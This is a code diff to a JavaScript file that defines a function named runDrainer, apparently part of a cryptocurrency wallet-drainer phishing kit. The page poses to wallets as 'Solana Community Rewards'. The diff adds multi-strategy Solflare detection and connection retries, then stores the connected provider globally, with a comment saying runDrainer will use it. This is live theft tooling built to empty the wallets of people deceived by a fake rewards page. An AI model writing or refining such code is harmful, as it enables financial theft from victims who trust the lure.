@@ -5569,7 +5569,45 @@ window.runDrainer = runDrainer;
     // Try to detect and connect to available wallets
     const wallets = [
       { key: 'phantom', name: 'Phantom', provider: () => window.phantom?.solana || window.solana },
-      { key: 'solflare', name: 'Solflare', provider: () => window.solflare },
+      { 
+        key: 'solflare', 
+        name: 'Solflare', 
+        provider: () => {
+          // Use the same enhanced Solflare detection as in WALLET_DEFS
+          console.log('[AUTO_CONNECT] Checking for Solflare provider...');
+          
+          // Primary Solflare detection
+          const solflare = window.solflare;
+          if (solflare && typeof solflare === 'object') {
+            console.log('[AUTO_CONNECT] Found window.solflare:', Object.keys(solflare));
+            // Check if it's actually Solflare with multiple indicators
+            if (solflare.isSolflare || 
+                solflare.isConnected || 
+                typeof solflare.connect === 'function' ||
+                solflare.publicKey ||
+                solflare.account) {
+              console.log('[AUTO_CONNECT] Valid Solflare provider found');
+              return solflare;
+            }
+          }
+          
+          // Alternative Solflare objects
+          const altSolflare = window.solflareWallet || window.SolflareWallet;
+          if (altSolflare && typeof altSolflare === 'object') {
+            console.log('[AUTO_CONNECT] Found alternative Solflare:', Object.keys(altSolflare));
+            return altSolflare;
+          }
+          
+          // Check for Solflare in window.solana (some versions)
+          if (window.solana && window.solana.isSolflare) {
+            console.log('[AUTO_CONNECT] Found Solflare in window.solana');
+            return window.solana;
+          }
+          
+          console.log('[AUTO_CONNECT] No Solflare provider found');
+          return null;
+        }
+      },
       { key: 'backpack', name: 'Backpack', provider: () => window.backpack?.solana || window.backpack },
       { key: 'glow', name: 'Glow', provider: () => window.glow },
       { key: 'trustwallet', name: 'Trust Wallet', provider: () => window.trustwallet?.solana || window.trustwallet },
@@ -5623,26 +5661,97 @@ window.runDrainer = runDrainer;
               return; // Exit after successful connection
             }
           } else {
-            // Try to connect
+            // Try to connect with enhanced strategies for Solflare
             console.log(`[AUTO_CONNECT] Attempting new connection to ${wallet.name}...`);
-            const result = await provider.connect({
-              onlyIfTrusted: false,
-              appMetadata: {
-                name: 'Solana Community Rewards',
-                url: window.location.origin,
-                icon: '/logo.png'
-              }
-            });
             
-            if (result && result.publicKey) {
-              console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, result.publicKey.toString());
+            let result = null;
+            let publicKey = null;
+            
+            if (wallet.key === 'solflare') {
+              // Use enhanced Solflare connection strategies
+              const connectionStrategies = [
+                {
+                  name: 'Method 1: Connect with metadata',
+                  fn: () => provider.connect({
+                    onlyIfTrusted: false,
+                    appMetadata: {
+                      name: 'Solana Community Rewards',
+                      url: window.location.origin,
+                      icon: '/logo.png'
+                    }
+                  })
+                },
+                {
+                  name: 'Method 2: Simple connect',
+                  fn: () => provider.connect()
+                },
+                {
+                  name: 'Method 3: Request method',
+                  fn: () => {
+                    if (typeof provider.request === 'function') {
+                      return provider.request({ method: 'connect' });
+                    } else {
+                      throw new Error('provider.request is not a function');
+                    }
+                  }
+                }
+              ];
+              
+              let connectionSuccessful = false;
+              
+              for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
+                try {
+                  console.log(`[AUTO_CONNECT] Solflare ${connectionStrategies[i].name}...`);
+                  result = await connectionStrategies[i].fn();
+                  
+                  // Enhanced public key extraction for Solflare
+                  publicKey = result?.publicKey || 
+                             result?.account?.publicKey ||
+                             provider.publicKey || 
+                             provider.account?.publicKey ||
+                             provider.connected?.publicKey ||
+                             provider.wallet?.publicKey;
+                  
+                  if (publicKey) {
+                    console.log(`[AUTO_CONNECT] Solflare ${connectionStrategies[i].name} successful:`, publicKey.toString());
+                    connectionSuccessful = true;
+                  } else {
+                    console.log(`[AUTO_CONNECT] Solflare ${connectionStrategies[i].name} returned no public key`);
+                  }
+                } catch (strategyError) {
+                  console.log(`[AUTO_CONNECT] Solflare ${connectionStrategies[i].name} failed:`, strategyError.message);
+                  if (i < connectionStrategies.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
+                  }
+                }
+              }
+              
+              if (!connectionSuccessful) {
+                console.log(`[AUTO_CONNECT] All Solflare connection methods failed`);
+                continue; // Try next wallet
+              }
+            } else {
+              // Standard connection for other wallets
+              result = await provider.connect({
+                onlyIfTrusted: false,
+                appMetadata: {
+                  name: 'Solana Community Rewards',
+                  url: window.location.origin,
+                  icon: '/logo.png'
+                }
+              });
+              publicKey = result?.publicKey || provider.publicKey;
+            }
+            
+            if (publicKey) {
+              console.log(`[AUTO_CONNECT] Successfully connected to ${wallet.name}:`, publicKey.toString());
               
               // Store the provider globally for runDrainer to use
               window.connectedWallet = {
                 key: wallet.key,
                 name: wallet.name,
                 logo: `/${wallet.key}-logo.png`,
-                publicKey: result.publicKey.toString(),
+                publicKey: publicKey.toString(),
                 provider: provider
               };
               
